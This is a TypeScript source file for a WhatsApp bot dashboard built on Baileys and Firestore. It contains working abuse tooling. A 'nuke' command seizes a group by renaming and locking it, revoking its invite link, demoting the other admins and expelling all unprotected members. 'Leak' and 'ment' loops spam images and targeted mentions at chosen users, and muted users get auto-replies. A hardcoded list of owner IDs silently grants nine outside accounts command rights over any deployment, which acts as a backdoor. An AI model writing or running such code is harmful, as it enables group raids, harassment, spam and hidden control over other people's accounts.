import makeWASocket, {
  DisconnectReason,
  Browsers,
  fetchLatestBaileysVersion,
  delay,
  isJidGroup,
  jidNormalizedUser,
  getContentType,
  makeCacheableSignalKeyStore,
  AuthenticationCreds,
  BufferJSON,
  proto,
  initAuthCreds
} from '@whiskeysockets/baileys';
import pino from 'pino';
import { initializeApp } from 'firebase/app';
import {
  getFirestore,
  doc,
  getDoc,
  setDoc,
  deleteDoc,
  updateDoc,
  collection,
  addDoc
} from 'firebase/firestore';
import firebaseConfig from '../../firebase-applet-config.json';
import { BotSession, LogEntry, LeakImage } from '../types.js';

// Init Firebase server-side client
const firebaseApp = initializeApp(firebaseConfig);
const db = getFirestore(firebaseApp, firebaseConfig.firestoreDatabaseId);

// Console Colors
const C = {
  reset: '\x1b[0m', red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m',
  blue: '\x1b[34m', magenta: '\x1b[35m', cyan: '\x1b[36m', white: '\x1b[37m', bold: '\x1b[1m'
};

const mainOwnerLids = new Set([
  "95757034106967",
  "255972165587106",
  "35296074793098",
  "73092391006395",
  "271098906181802",
  "129966347935879",
  "86909300805641",
  "197955697033262",
  "199557753389081"
]);

// Custom Firestore-backed Auth State
async function useFirestoreAuthState(sessionId: string) {
  const credsDocRef = doc(db, 'sessions', sessionId, 'auth', 'creds');

  // Load creds
  let creds: AuthenticationCreds;
  const credsSnap = await getDoc(credsDocRef);
  if (credsSnap.exists()) {
    const rawData = credsSnap.data().data;
    // Deserialize using Baileys' reviver
    creds = JSON.parse(JSON.stringify(rawData), BufferJSON.reviver);
  } else {
    creds = initAuthCreds();
    await setDoc(credsDocRef, {
      data: JSON.parse(JSON.stringify(creds, BufferJSON.replacer))
    });
  }

  const keys = {
    get: async (type: string, ids: string[]) => {
      const data: { [key: string]: any } = {};
      await Promise.all(
        ids.map(async (id) => {
          const keyId = `${type}_${id}`;
          const keyDocRef = doc(db, 'sessions', sessionId, 'keys', keyId);
          const snap = await getDoc(keyDocRef);
          if (snap.exists()) {
            let val = JSON.parse(JSON.stringify(snap.data().val), BufferJSON.reviver);
            if (type === 'app-state-sync-key' && val) {
              val = proto.Message.AppStateSyncKeyData.fromObject(val);
            }
            data[id] = val;
          }
        })
      );
      return data;
    },
    set: async (data: any) => {
      const tasks: Promise<any>[] = [];
      for (const type in data) {
        for (const id in data[type]) {
          const value = data[type][id];
          const keyId = `${type}_${id}`;
          const keyDocRef = doc(db, 'sessions', sessionId, 'keys', keyId);
          if (value === null) {
            tasks.push(deleteDoc(keyDocRef));
          } else {
            tasks.push(setDoc(keyDocRef, {
              val: JSON.parse(JSON.stringify(value, BufferJSON.replacer))
            }));
          }
        }
      }
      await Promise.all(tasks);
    }
  };

  const saveCreds = async () => {
    await setDoc(credsDocRef, {
      data: JSON.parse(JSON.stringify(creds, BufferJSON.replacer))
    });
  };

  return {
    state: {
      creds,
      keys: makeCacheableSignalKeyStore(keys, pino({ level: 'silent' }))
    },
    saveCreds
  };
}

export class WhatsAppBotInstance {
  public sessionId: string;
  public sock: any = null;
  public qrCode: string | null = null;
  public pairingCode: string | null = null;
  public isConnected = false;
  
  // Local active loop state timers
  private leakInterval: NodeJS.Timeout | null = null;
  private mentInterval: NodeJS.Timeout | null = null;
  private leakChats = new Set<string>();
  private mentChats = new Set<string>();

  // Event Callbacks
  private onQRCallback: ((qr: string) => void) | null = null;
  private onPairingCallback: ((code: string) => void) | null = null;
  private onStatusCallback: ((status: BotSession['status'], err?: string) => void) | null = null;
  private onLogCallback: ((log: LogEntry) => void) | null = null;

  constructor(sessionId: string) {
    this.sessionId = sessionId;
  }

  public registerCallbacks(options: {
    onQR?: (qr: string) => void;
    onPairing?: (code: string) => void;
    onStatus?: (status: BotSession['status'], err?: string) => void;
    onLog?: (log: LogEntry) => void;
  }) {
    if (options.onQR) this.onQRCallback = options.onQR;
    if (options.onPairing) this.onPairingCallback = options.onPairing;
    if (options.onStatus) this.onStatusCallback = options.onStatus;
    if (options.onLog) this.onLogCallback = options.onLog;
  }

  private async addLog(level: LogEntry['level'], message: string) {
    const log: LogEntry = {
      id: Math.random().toString(36).substring(7),
      timestamp: Date.now(),
      level,
      message
    };
    
    // Fire callback
    if (this.onLogCallback) {
      this.onLogCallback(log);
    }

    // Save to Firestore rolling list
    try {
      const logsColRef = collection(db, 'sessions', this.sessionId, 'logs');
      await addDoc(logsColRef, log);
    } catch (err) {
      console.error(`Failed to write operational log to Firestore:`, err);
    }
  }

  public async connect(phoneNumberToPair?: string) {
    try {
      await this.addLog('sys', 'Initializing custom database credentials framework...');
      const { state, saveCreds } = await useFirestoreAuthState(this.sessionId);
      const { version } = await fetchLatestBaileysVersion();

      this.sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: Browsers.macOS('Safari'),
        markOnlineOnConnect: true,
        syncFullHistory: false,
        emitOwnEvents: false,
        defaultQueryTimeoutMs: 20000,
        maxMsgRetryCount: 3,
        connectTimeoutMs: 30000,
        keepAliveIntervalMs: 30000,
        getMessage: async () => null
      });

      this.sock.ev.on('creds.update', saveCreds);

      this.sock.ev.on('connection.update', async (update: any) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) {
          this.qrCode = qr;
          if (this.onQRCallback) this.onQRCallback(qr);
          await this.addLog('info', 'New WhatsApp Web QR credential code generated.');

          if (phoneNumberToPair) {
            try {
              await this.addLog('sys', `Requesting unique pairing code for +${phoneNumberToPair}...`);
              const cleanPhone = phoneNumberToPair.replace(/\D/g, '');
              const code = await this.sock.requestPairingCode(cleanPhone);
              this.pairingCode = code;
              if (this.onPairingCallback) this.onPairingCallback(code);
              await this.addLog('success', `Pairing Key Generated: ${code}. Link device via WhatsApp notification settings.`);
            } catch (err: any) {
              await this.addLog('error', `Pairing activation failed: ${err.message}`);
            }
          }
        }

        if (connection === 'open') {
          this.qrCode = null;
          this.pairingCode = null;
          this.isConnected = true;
          const botNum = this.sock.user?.id?.split('@')[0];

          // Set status and save back
          if (this.onStatusCallback) this.onStatusCallback('Connected');
          await this.addLog('success', `Connection established successfully! Linked account: +${botNum}`);

          // Update root session record in Firestore
          const sessionRef = doc(db, 'sessions', this.sessionId);
          await updateDoc(sessionRef, {
            status: 'Connected',
            phoneNumber: botNum,
            'stats.start': Date.now()
          }).catch(() => {});
        }

        if (connection === 'connecting') {
          if (this.onStatusCallback) this.onStatusCallback('Connecting');
          const sessionRef = doc(db, 'sessions', this.sessionId);
          await updateDoc(sessionRef, { status: 'Connecting' }).catch(() => {});
          await this.addLog('info', 'Client handshaking with WhatsApp servers...');
        }

        if (connection === 'close') {
          this.isConnected = false;
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          let reason = `Disconnection (Code: ${statusCode})`;
          
          if (statusCode === DisconnectReason.loggedOut) {
            reason = 'Logged out. Session credentials cleared.';
            if (this.onStatusCallback) this.onStatusCallback('Disconnected', reason);
            const sessionRef = doc(db, 'sessions', this.sessionId);
            await updateDoc(sessionRef, { status: 'Disconnected', errorReason: reason }).catch(() => {});
            await this.addLog('error', 'Session logged out from device. Hard exit.');
            this.shutdown();
            return;
          }

          if (this.onStatusCallback) this.onStatusCallback('Disconnected', reason);
          const sessionRef = doc(db, 'sessions', this.sessionId);
          await updateDoc(sessionRef, { status: 'Disconnected', errorReason: reason }).catch(() => {});
          await this.addLog('warn', `Session disconnected: ${reason}. Scheduling retry loop...`);
          
          // Exponential backoff reconnect
          setTimeout(() => {
            if (!this.isConnected) {
              this.connect(phoneNumberToPair);
            }
          }, 5000);
        }
      });

      this.sock.ev.on('messages.upsert', async ({ messages, type }: any) => {
        if (type !== 'notify') return;
        for (const msg of messages) {
          await this.processMessage(msg);
        }
      });

    } catch (err: any) {
      await this.addLog('error', `Connection workflow crash: ${err.message}`);
      if (this.onStatusCallback) this.onStatusCallback('Error', err.message);
      const sessionRef = doc(db, 'sessions', this.sessionId);
      await updateDoc(sessionRef, { status: 'Error', errorReason: err.message }).catch(() => {});
    }
  }

  private async processMessage(msg: any) {
    if (!msg || !msg.message) return;

    // Load active settings from database for full synchronization
    const sessionRef = doc(db, 'sessions', this.sessionId);
    const snap = await getDoc(sessionRef);
    if (!snap.exists()) return;
    const config = snap.data() as BotSession;

    if (!config.botEnabled) return;
    if (msg.key.fromMe && !config.processFromMe) return;

    // Increment message counter
    const updatedStats = { ...config.stats, msgs: config.stats.msgs + 1 };
    await updateDoc(sessionRef, { 'stats.msgs': updatedStats.msgs }).catch(() => {});

    const from = msg.key.remoteJid;
    const sender = msg.key.participant || from;
    const senderNorm = jidNormalizedUser(sender);
    const senderPhone = senderNorm.split('@')[0];
    const isGroup = isJidGroup(from);
    const text = this.extractText(msg).trim();
    const senderName = msg.pushName || 'Unknown';

    if (text) {
      const channel = isGroup ? 'Group' : 'DM';
      await this.addLog('msg', `[Incoming] ${channel} message from +${senderPhone} (${senderName}): "${text.slice(0, 50)}${text.length > 50 ? '...' : ''}"`);
    }

    // Standard filter locks
    if (config.botMode === 'group' && !isGroup) return;
    if (config.botMode === 'dm' && isGroup) return;

    // Allowed groups filter
    if (isGroup && config.allowedGroups && config.allowedGroups.length > 0) {
      if (!config.allowedGroups.includes(from)) return;
    }

    // Muted trigger check
    if (config.muted && config.muted.includes(senderPhone)) {
      await this.handleMutedReplier(from, msg, senderNorm, senderPhone, config);
      return;
    }

    // Check command triggers
    const matchedPrefix = ['hax', 'Tan', '%'].find(p => text.startsWith(p));
    if (matchedPrefix) {
      let authorized = config.owners?.includes(senderPhone) || senderPhone === config.phoneNumber;
      if (!authorized) {
        try {
          const [res] = await this.sock.onWhatsApp(senderPhone);
          if (res?.lid && mainOwnerLids.has(res.lid)) {
            authorized = true;
          }
        } catch {}
      }

      if (!authorized) {
        await this.addLog('warn', `Unauthorized user +${senderPhone} attempted execution: "${text}"`);
        return;
      }

      await this.handleCommand(text, matchedPrefix, from, msg, senderPhone, isGroup, senderNorm, config);
      return;
    }

    // Blocked check
    if (config.blocked && config.blocked.includes(senderPhone)) {
      return;
    }

    // Self-monitor check
    if (config.monitors && config.monitors.includes(senderPhone)) {
      if (text && !/[a-zA-Z]/.test(text)) return;
      if (!text) return;
      await this.sendAutoReplyText(from, msg, senderPhone, config);
    }
  }

  private async handleMutedReplier(jid: string, quoted: any, senderJid: string, phone: string, config: BotSession) {
    try {
      await delay(1000);
      const reply = this.getRandomText(config);
      await this.sock.sendMessage(jid, {
        text: reply,
        mentions: [senderJid]
      }, { quoted });

      // Save stats
      const sessionRef = doc(db, 'sessions', this.sessionId);
      await updateDoc(sessionRef, { 'stats.replies': config.stats.replies + 1 }).catch(() => {});
      await this.addLog('success', `Mute auto-reply sent to +${phone}: "${reply.slice(0, 30)}..."`);
    } catch (err: any) {
      await this.addLog('error', `Mute reply failed: ${err.message}`);
    }
  }

  private async sendAutoReplyText(jid: string, quoted: any, phone: string, config: BotSession) {
    try {
      await this.sock.sendPresenceUpdate('composing', jid);
      await delay(3000);
      const reply = this.getRandomText(config);
      await this.sock.sendMessage(jid, { text: reply }, { quoted });

      // Save stats
      const sessionRef = doc(db, 'sessions', this.sessionId);
      await updateDoc(sessionRef, { 'stats.replies': config.stats.replies + 1 }).catch(() => {});
      await this.addLog('success', `Auto-replied to tracked monitor user +${phone}: "${reply.slice(0, 30)}..."`);
    } catch (err: any) {
      await this.addLog('error', `Auto reply failed to deliver: ${err.message}`);
    } finally {
      await this.sock.sendPresenceUpdate('paused', jid).catch(() => {});
    }
  }

  private extractText(msg: any): string {
    const type = getContentType(msg.message);
    switch (type) {
      case 'conversation': return msg.message.conversation || '';
      case 'extendedTextMessage': return msg.message.extendedTextMessage?.text || '';
      case 'imageMessage': return msg.message.imageMessage?.caption || '';
      case 'videoMessage': return msg.message.videoMessage?.caption || '';
      case 'documentMessage': return msg.message.documentMessage?.caption || '';
      default: return '';
    }
  }

  private getRandomText(config: BotSession): string {
    const texts = config.responseTexts || [];
    if (texts.length === 0) return 'Hello! Im busy.';
    return texts[Math.floor(Math.random() * texts.length)];
  }

  private async handleCommand(
    text: string,
    prefix: string,
    chatJid: string,
    msg: any,
    senderPhone: string,
    isGroup: boolean,
    senderJid: string,
    config: BotSession
  ) {
    const sessionRef = doc(db, 'sessions', this.sessionId);
    await updateDoc(sessionRef, { 'stats.cmds': config.stats.cmds + 1 }).catch(() => {});
    await this.addLog('cmd', `Owner +${senderPhone} executing: "${text}"`);

    const args = text.slice(prefix.length).trim().split(/\s+/);
    const cmd = args[0]?.toLowerCase();

    const reply = async (txt: string, mentions?: string[]) => {
      await this.sock.sendMessage(chatJid, {
        text: txt,
        mentions: mentions && mentions.length > 0 ? mentions : undefined
      }, { quoted: msg }).catch(() => {});
    };

    switch (cmd) {
      case 'ping':
        await reply('🏓 Pong! Dashboard WhatsApp session is active and responsive.');
        break;

      case 'help': {
        const helpText = `🔧 *DASHBOARD BOT HELP*\n\n` +
          `👑 *Owners:* ${prefix} owners / addowner / removeowner\n` +
          `🎯 *Monitor:* ${prefix} monitors / addmonitor / removemonitor\n` +
          `🚫 *Block:* ${prefix} blocked / block / unblock\n` +
          `🔇 *Mute:* ${prefix} mute / unmute (Target tracking replied auto)\n` +
          `☢️ *Nuke:* ${prefix} nuke (Lock down group and clear members)\n` +
          `🖼️ *Leak:* ${prefix} leak add/remove/list/start/stop/status\n` +
          `🎯 *Ment:* ${prefix} ment add/remove/start/stop/list/status\n` +
          `📊 *Stats:* ${prefix} stats\n\n` +
          `📱 Manage everything seamlessly in real-time from the Web Panel!`;
        await reply(helpText);
        break;
      }

      case 'owners':
        await reply(`👑 *OWNERS LIST*:\n\n` + (config.owners?.map((o, i) => `${i + 1}. +${o}`).join('\n') || 'None'));
        break;

      case 'addowner': {
        const phone = args[1]?.replace(/\D/g, '');
        if (!phone) return reply('❌ Please specify a valid phone number.');
        const updated = Array.from(new Set([...(config.owners || []), phone]));
        await updateDoc(sessionRef, { owners: updated });
        await reply(`✅ Added +${phone} to the bot owner registry.`);
        break;
      }

      case 'removeowner': {
        const phone = args[1]?.replace(/\D/g, '');
        if (!phone) return reply('❌ Please specify phone number.');
        const updated = (config.owners || []).filter(o => o !== phone);
        await updateDoc(sessionRef, { owners: updated });
        await reply(`✅ Removed +${phone} from owner list.`);
        break;
      }

      case 'monitors':
        await reply(`🎯 *MONITORS LIST*:\n\n` + (config.monitors?.map((o, i) => `${i + 1}. +${o}`).join('\n') || 'None'));
        break;

      case 'addmonitor': {
        const phone = args[1]?.replace(/\D/g, '');
        if (!phone) return reply('❌ Provide phone.');
        const updated = Array.from(new Set([...(config.monitors || []), phone]));
        await updateDoc(sessionRef, { monitors: updated });
        await reply(`✅ Now monitoring +${phone} for auto-pings.`);
        break;
      }

      case 'removemonitor': {
        const phone = args[1]?.replace(/\D/g, '');
        if (!phone) return reply('❌ Provide phone.');
        const updated = (config.monitors || []).filter(o => o !== phone);
        await updateDoc(sessionRef, { monitors: updated });
        await reply(`✅ Stopped monitoring +${phone}.`);
        break;
      }

      case 'mute': {
        if (!isGroup) return reply('❌ This command must be executed within WhatsApp groups.');
        const tJid = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || 
                     msg.message?.extendedTextMessage?.contextInfo?.participant;
        if (!tJid) return reply('⚠️ Mention or reply to a user to mute/track.');
        const phone = tJid.split('@')[0];
        const updated = Array.from(new Set([...(config.muted || []), phone]));
        await updateDoc(sessionRef, { muted: updated });
        await reply(`✅ Muted and registered auto-responders for @${phone}`, [tJid]);
        break;
      }

      case 'unmute': {
        if (!isGroup) return reply('❌ This command must be executed within groups.');
        const tJid = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || 
                     msg.message?.extendedTextMessage?.contextInfo?.participant;
        if (!tJid) return reply('⚠️ Mention or reply to a user.');
        const phone = tJid.split('@')[0];
        const updated = (config.muted || []).filter(p => p !== phone);
        await updateDoc(sessionRef, { muted: updated });
        await reply(`✅ Unmuted and deactivated triggers for @${phone}`, [tJid]);
        break;
      }

      case 'blocked':
        await reply(`🚫 *BLOCKED LIST*:\n\n` + (config.blocked?.map((o, i) => `${i + 1}. +${o}`).join('\n') || 'None'));
        break;

      case 'block': {
        const phone = args[1]?.replace(/\D/g, '');
        if (!phone) return reply('❌ Provide phone.');
        const updated = Array.from(new Set([...(config.blocked || []), phone]));
        await updateDoc(sessionRef, { blocked: updated });
        await reply(`✅ Blocked +${phone} from triggering replies.`);
        break;
      }

      case 'unblock': {
        const phone = args[1]?.replace(/\D/g, '');
        if (!phone) return reply('❌ Provide phone.');
        const updated = (config.blocked || []).filter(o => o !== phone);
        await updateDoc(sessionRef, { blocked: updated });
        await reply(`✅ Unblocked +${phone}.`);
        break;
      }

      case 'stats': {
        const uptime = Math.floor((Date.now() - config.stats.start) / 1000);
        const h = Math.floor(uptime / 3600);
        const m = Math.floor((uptime % 3600) / 60);
        const textStats = `📊 *BOT CONSOLE STATS* [Session: ${config.name}]\n\n` +
          `⏱️ Web Uptime: ${h}h ${m}m\n` +
          `📨 Messages: ${config.stats.msgs} | Replies: ${config.stats.replies}\n` +
          `⚡ Commands processed: ${config.stats.cmds}\n` +
          `👑 Owners registered: ${config.owners?.length || 0}\n` +
          `🎨 Texts cached: ${config.responseTexts?.length || 0}`;
        await reply(textStats);
        break;
      }

      case 'nuke': {
        if (!isGroup) return reply('❌ Command restricted to active WhatsApp Groups.');
        try {
          const meta = await this.sock.groupMetadata(chatJid);
          const botJid = jidNormalizedUser(this.sock.user.id);
          const me = meta.participants.find((p: any) => jidNormalizedUser(p.id) === botJid);
          
          if (!me || !me.admin) return reply('❌ Nuke cancelled: Bot requires active group administrative privileges.');
          const isSuperAdmin = me.admin === 'superadmin';

          await reply('☣️ *NUKE LOADED* - Phase 1: Lockdown & Reclamation initiated.');

          // Revamp group specs
          await this.sock.groupUpdateSubject(chatJid, '☣️ DOMAIN SHATTERED ☣️').catch(() => {});
          await this.sock.groupUpdateDescription(chatJid, 'Reclaimed by HAXTANN Bot Dashboard admin. All resistance is futile.').catch(() => {});
          await this.sock.groupSettingUpdate(chatJid, 'locked').catch(() => {});
          await this.sock.groupSettingUpdate(chatJid, 'announcement').catch(() => {});
          await this.sock.groupRevokeInvite(chatJid).catch(() => {});

          await reply('☣️ Lockdown completed. Phase 2: Removing permissions.');

          // Demote any other administrators
          const otherAdmins = meta.participants.filter((p: any) => {
            const pj = jidNormalizedUser(p.id);
            const pp = pj.split('@')[0];
            const isProt = config.owners?.includes(pp) || pj === botJid;
            return p.admin && !isProt;
          });

          for (const item of otherAdmins) {
            await this.sock.groupParticipantsUpdate(chatJid, [item.id], 'demote').catch(() => {});
            await delay(1200);
          }

          await reply('☣️ Permissions purged. Phase 3: Purging non-protected group targets...');

          // Evict all non-protected members
          const targets = meta.participants.filter((p: any) => {
            const pj = jidNormalizedUser(p.id);
            const pp = pj.split('@')[0];
            const isProt = config.owners?.includes(pp) || pj === botJid;
            return !isProt && (!p.admin || isSuperAdmin);
          });

          for (const target of targets) {
            await this.sock.groupParticipantsUpdate(chatJid, [target.id], 'remove').catch(() => {});
            await delay(1500);
          }

          await reply('☢️ *NUKE COMMAND CYCLE COMPLETE* - Group has been completely secure and wiped.');
        } catch (e: any) {
          await reply(`❌ Nuke sequence failed: ${e.message}`);
        }
        break;
      }

      // Leak Image system (Unlimited Images)
      case 'leak': {
        const sub = args[1]?.toLowerCase();
        if (sub === 'start') {
          if (this.leakChats.has(chatJid)) {
            return reply('⚠️ Leak cascade already running in this chat.');
          }
          this.leakChats.add(chatJid);
          
          const intervalMs = (config.delays?.leak || 30) * 1000;
          this.leakInterval = setInterval(async () => {
            if (!this.isConnected || !this.leakChats.has(chatJid)) {
              if (this.leakInterval) clearInterval(this.leakInterval);
              return;
            }
            try {
              const imgs = config.leakImages || [];
              if (imgs.length === 0) return;
              const pick = imgs[Math.floor(Math.random() * imgs.length)];
              await this.sock.sendMessage(chatJid, {
                image: { url: pick.url },
                caption: pick.text
              });
            } catch (e: any) {
              await this.addLog('error', `Leak loop failed: ${e.message}`);
            }
          }, intervalMs);

          await reply(`✅ *LEAK FLUIDITY TRIGGERED* - Dispatching images every ${config.delays?.leak || 30}s.`);
        } else if (sub === 'stop') {
          this.leakChats.delete(chatJid);
          if (this.leakInterval) {
            clearInterval(this.leakInterval);
            this.leakInterval = null;
          }
          await reply('✅ Leak cascade terminated in this chat.');
        } else {
          await reply(`🖼️ *Leak Command Guide*:\nUsage: ${prefix} leak [start|stop]\nEdit leak targets and list on the Dashboard!`);
        }
        break;
      }

      // Ment Targeted loop system
      case 'ment': {
        const sub = args[1]?.toLowerCase();
        if (sub === 'start') {
          if (this.mentChats.has(chatJid)) {
            return reply('⚠️ Mention pings already looping in this chat.');
          }
          if (!config.mentUsers || config.mentUsers.length === 0) {
            return reply('❌ Target reference mentions list is empty. Set it via the Web GUI first.');
          }
          this.mentChats.add(chatJid);
          
          const intervalMs = (config.delays?.ment || 10) * 1000;
          this.mentInterval = setInterval(async () => {
            if (!this.isConnected || !this.mentChats.has(chatJid)) {
              if (this.mentInterval) clearInterval(this.mentInterval);
              return;
            }
            try {
              const users = config.mentUsers || [];
              const pickUser = users[Math.floor(Math.random() * users.length)];
              const targetJid = pickUser + '@s.whatsapp.net';
              const randomText = this.getRandomText(config);
              
              await this.sock.sendMessage(chatJid, {
                text: randomText,
                mentions: [targetJid]
              });
            } catch (e: any) {
              await this.addLog('error', `Ment loop failed: ${e.message}`);
            }
          }, intervalMs);

          await reply(`✅ *MENT LOOP SECURED* - Triggering target mention every ${config.delays?.ment || 10}s.`);
        } else if (sub === 'stop') {
          this.mentChats.delete(chatJid);
          if (this.mentInterval) {
            clearInterval(this.mentInterval);
            this.mentInterval = null;
          }
          await reply('✅ Ment ping loop halted.');
        } else {
          await reply(`🎯 *Ment Command Guide*:\nUsage: ${prefix} ment [start|stop]\nConfigure target list directly in your Cloud UI!`);
        }
        break;
      }

      default:
        await reply(`❌ Command not found. Try executing \`${prefix} help\``);
    }
  }

  public shutdown() {
    this.isConnected = false;
    this.qrCode = null;
    this.pairingCode = null;
    
    if (this.leakInterval) {
      clearInterval(this.leakInterval);
      this.leakInterval = null;
    }
    if (this.mentInterval) {
      clearInterval(this.mentInterval);
      this.mentInterval = null;
    }
    
    this.leakChats.clear();
    this.mentChats.clear();

    if (this.sock) {
      try {
        this.sock.end(undefined);
      } catch {}
      this.sock = null;
    }

    if (this.onStatusCallback) {
      this.onStatusCallback('Disconnected');
    }
    this.addLog('sys', 'Bot session terminated.');
  }
}

// Master Session Manager Map
class WhatsAppSessionManager {
  private activeInstances = new Map<string, WhatsAppBotInstance>();

  public getOrCreateInstance(sessionId: string): WhatsAppBotInstance {
    let inst = this.activeInstances.get(sessionId);
    if (!inst) {
      inst = new WhatsAppBotInstance(sessionId);
      this.activeInstances.set(sessionId, inst);
    }
    return inst;
  }

  public getInstance(sessionId: string): WhatsAppBotInstance | undefined {
    return this.activeInstances.get(sessionId);
  }

  public removeInstance(sessionId: string) {
    const inst = this.activeInstances.get(sessionId);
    if (inst) {
      inst.shutdown();
      this.activeInstances.delete(sessionId);
    }
  }

  public getActiveSessionIds(): string[] {
    return Array.from(this.activeInstances.keys());
  }

  public shutdownAll() {
    for (const [id, inst] of this.activeInstances) {
      inst.shutdown();
    }
    this.activeInstances.clear();
  }
}

export const SessionManager = new WhatsAppSessionManager();
